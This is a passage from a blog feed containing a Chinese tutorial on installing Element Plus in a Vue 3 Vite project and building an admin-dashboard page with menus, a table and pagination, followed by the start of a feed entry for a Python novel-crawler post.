href="https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95">https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95</a></p><p>首先安装ElementUI的使用库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-plus --save</span><br></pre></td></tr></table></figure><p>​在vue3中按需引入ElementUI，需要使用其他的插件辅助，需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件；安装方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure><p>还需要在vite.config.js文件该为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在main.js中修改为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//import &#x27;./assets/main.css&#x27;</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>引入完毕之后，我们可进行按需引入需要使用的组件，使用方法如下，引入input组件和button组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-input class=&quot;input&quot; v-model=&quot;input&quot; type=&quot;file&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">    &lt;el-button class=&quot;button&quot; type=&quot;primary&quot;&gt;文件处理&lt;/el-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import &#123; ElButton, ElInput &#125; from &#x27;element-plus&#x27;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">  </span><br><span class="line">  export default &#123;</span><br><span class="line">    components: &#123; ElButton,ElInput &#125;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.input &#123;</span><br><span class="line">  display: inline;</span><br><span class="line">  margin: 20px 30px;</span><br><span class="line">&#125;</span><br><span class="line">.button &#123;</span><br><span class="line">  width: 90px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112136801.png" alt="img"></p><h4 id="4，使用ElementUI组件搭建管理系统页面"><a href="#4，使用ElementUI组件搭建管理系统页面" class="headerlink" title="4，使用ElementUI组件搭建管理系统页面"></a>4，使用ElementUI组件搭建管理系统页面</h4><p>创建一个manger.vue，然后在App.vue中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import manger from &#x27;./view/manger.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;manger&gt;&lt;/manger&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>在其中用了菜单，按钮，图标，表格，分页等组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">htm,组件代码在&lt;template&gt;中</span><br><span class="line">JavaScript代码在&lt;script&gt;中</span><br><span class="line">css代码在&lt;style&gt;中</span><br><span class="line">&lt;el-row&gt;表示行    span表示占比，一共为24</span><br><span class="line">&lt;el-col&gt;表示列</span><br></pre></td></tr></table></figure><p>成品代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123;  ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123;</span><br><span class="line">  Check, </span><br><span class="line">  Close,</span><br><span class="line">    Menu,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  User,</span><br><span class="line">  Setting,</span><br><span class="line">  ShoppingBag,</span><br><span class="line">  Memo,</span><br><span class="line">  PieChart,</span><br><span class="line">  Fold,</span><br><span class="line">  ElemeFilled,</span><br><span class="line">  ChromeFilled,</span><br><span class="line">  Opportunity,</span><br><span class="line">  Edit,</span><br><span class="line">  Delete,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line"></span><br><span class="line">const value2=ref(true)</span><br><span class="line">const currentPage3 = ref(5)</span><br><span class="line">const pageSize3 = ref(100)</span><br><span class="line">const small = ref(false)</span><br><span class="line">const background = ref(false)</span><br><span class="line">const disabled = ref(false)</span><br><span class="line"></span><br><span class="line">const handleSizeChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`$&#123;val&#125; items per page`)</span><br><span class="line">&#125;</span><br><span class="line">const handleCurrentChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`current page: $&#123;val&#125;`)</span><br><span class="line">&#125;</span><br><span class="line">const input = ref(&#x27;&#x27;)</span><br><span class="line">const handleOpen = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: 1,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    email: &#x27;1111111@qq.com&#x27;,</span><br><span class="line">    phone:123456,</span><br><span class="line">    nickname:&#x27;tom1&#x27;,</span><br><span class="line">    value2:true,</span><br><span class="line">    data:&#x27;2016-05-01&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: 2,</span><br><span class="line">    name: &#x27;lin&#x27;,</span><br><span class="line">    email: &#x27;2222222@qq.com&#x27;,</span><br><span class="line">    phone:456789,</span><br><span class="line">    nickname:&#x27;lin1&#x27;,</span><br><span class="line">    value2:false,</span><br><span class="line">    data:&#x27;2016-05-02&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;full-screen-div&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;common-layout&quot;&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">          &lt;el-aside class=&quot;ce&quot;&gt;</span><br><span class="line">            &lt;h1 class=&quot;title&quot;&gt;xxx管理系统&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">            &lt;el-row class=&quot;tac&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-col :span=&quot;24&quot;&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;el-menu</span><br><span class="line">                    active-text-color=&quot;#ffd04b&quot;</span><br><span class="line">                    background-color=&quot;#344155&quot;</span><br><span class="line">                    class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">                    default-active=&quot;1&quot;</span><br><span class="line">                    text-color=&quot;#fff&quot;</span><br><span class="line">                    ref=&quot;menu&quot;</span><br><span class="line">                    @open=&quot;handleOpen&quot;</span><br><span class="line">                    @close=&quot;handleClose&quot;</span><br><span class="line">                    @click=&quot;handleMenuClick&quot;</span><br><span class="line">                  &gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;1-1&quot;&gt;</span><br><span class="line">                      &lt;template #title&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        &lt;span&gt;用户管理&lt;/span&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                      &lt;el-menu-item index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        用户列表</span><br><span class="line">                    &lt;/el-menu-item&gt;</span><br><span class="line">                    &lt;/el-sub-menu&gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;2-2&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;权限管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            权限列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;3-3&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;ShoppingBag /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;商品管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;3&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            商品列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;4-4&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Memo /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;订单管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            订单列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;5-5&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;PieChart /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;数据统计&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;5&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            数据列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                  &lt;/el-menu&gt;</span><br><span class="line">                &lt;/el-col&gt;</span><br><span class="line">              &lt;/el-row&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;/el-aside&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">            &lt;el-header&gt;</span><br><span class="line">                &lt;div class=&quot;head&quot;&gt;</span><br><span class="line">                  &lt;el-icon&gt;&lt;Fold /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;首页&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt; </span><br><span class="line">                  &lt;span&gt;用户列表&lt;/span&gt;</span><br><span class="line">                  &lt;div class=&quot;components&quot;&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ElemeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ChromeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;Opportunity /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &lt;/el-header&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &lt;el-main&gt;</span><br><span class="line">              &lt;div class=&quot;main1&quot;&gt;</span><br><span class="line">                &lt;el-row :span=&quot;2&quot; &gt;</span><br><span class="line">                  &lt;el-col :span=&quot;6&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-input v-model=&quot;input&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;3&quot;  class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;添加用户&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;el-row :span=&quot;15&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;el-table :data=&quot;tableData&quot; border style=&quot;width: 100%&quot;&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;id&quot; label=&quot;#&quot; width=&quot;60&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;email&quot; label=&quot;Email&quot; width=&quot;180&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;phone&quot; label=&quot;Phone&quot; width=&quot;130&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;nickname&quot; label=&quot;NickNmae&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column  label=&quot;State&quot; width=&quot;150&quot; v-slot=&quot;&#123;row&#125;&quot;  &gt;</span><br><span class="line">                      &lt;el-switch</span><br><span class="line">                          v-model=&quot;row.value2&quot;</span><br><span class="line">                          class=&quot;mt-2&quot;</span><br><span class="line">                          style=&quot;margin-left: 24px&quot;</span><br><span class="line">                          inline-prompt</span><br><span class="line">                          :active-icon=&quot;Check&quot;</span><br><span class="line">                          :inactive-icon=&quot;Close&quot;</span><br><span class="line">                        /&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;data&quot; label=&quot;CreateData&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column label=&quot;操作&quot;&gt;</span><br><span class="line">                      &lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#589DF6&quot;&gt;&lt;el-icon color=&quot;#FFFFFF&quot; &gt;&lt;Edit/&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#E47471&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Delete /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#DCA452&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                  &lt;/el-table&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-row :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;div class=&quot;demo-pagination-block&quot;&gt;</span><br><span class="line">                    &lt;el-pagination</span><br><span class="line">                      v-model:current-page=&quot;currentPage3&quot;</span><br><span class="line">                      v-model:page-size=&quot;pageSize3&quot;</span><br><span class="line">                      :small=&quot;small&quot;</span><br><span class="line">                      :disabled=&quot;disabled&quot;</span><br><span class="line">                      :background=&quot;background&quot;</span><br><span class="line">                      layout=&quot;prev, pager, next, jumper&quot;</span><br><span class="line">                      :total=&quot;1000&quot;</span><br><span class="line">                      @size-change=&quot;handleSizeChange&quot;</span><br><span class="line">                      @current-change=&quot;handleCurrentChange&quot;</span><br><span class="line">                    /&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">              &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/el-main&gt;</span><br><span class="line">          &lt;/el-container&gt;</span><br><span class="line">        &lt;/el-container&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.full-screen-div &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    background-color: white;</span><br><span class="line">    z-index: 9999;</span><br><span class="line">&#125;</span><br><span class="line">.ce&#123;</span><br><span class="line">    width: 15vw;</span><br><span class="line">    height: 100vh;</span><br><span class="line">    background: #344155;</span><br><span class="line">&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">    padding-top: 15px;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    color: white;</span><br><span class="line">    text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.head&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    padding-top: 30px;</span><br><span class="line">    padding-bottom: 13px;</span><br><span class="line">    border-bottom: 1px solid black;</span><br><span class="line">    font-family: &#x27;黑体&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">.components &#123;  </span><br><span class="line">  position: absolute;  </span><br><span class="line">  top: 10px;</span><br><span class="line">  right: 30px;  </span><br><span class="line">  align-items: center;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">.component &#123;  </span><br><span class="line">  width: 50px;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin-right: 30px;  </span><br><span class="line">&#125;</span><br><span class="line">.main1 &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 80%;</span><br><span class="line">  border-bottom: 10px solid #EBEBEB; /* 设置下边框的宽度、样式和颜色 */  </span><br><span class="line">  box-shadow: 0 2px 3px #EBEBEB; /* 在下边框上添加阴影 */</span><br><span class="line">&#125;</span><br><span class="line">.center&#123;</span><br><span class="line">  display: flex;  </span><br><span class="line">  justify-content: center; /* 水平居中 */</span><br><span class="line">  padding-bottom: 20px;</span><br><span class="line">  padding-top: 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141494.png" alt="image-20231211212056199"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，要使用vue前先下载node-js&quot;&gt;&lt;a href=&quot;#1，要使用vue前先下载node-js&quot; class=&quot;headerlink&quot; title=&quot;1，要使用vue前先下载node.js&quot;&gt;&lt;/a&gt;1，要使用vue前先下载node.js&lt;/h4&gt;&lt;p&gt;下载</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十五，python爬虫-小说下载器</title>
    <link href="http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <id>http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/</id>
    <published>2023-12-08T13:10:21.000Z</published>
    <updated>2023-12-08T13:20:52.895Z</updated>
    
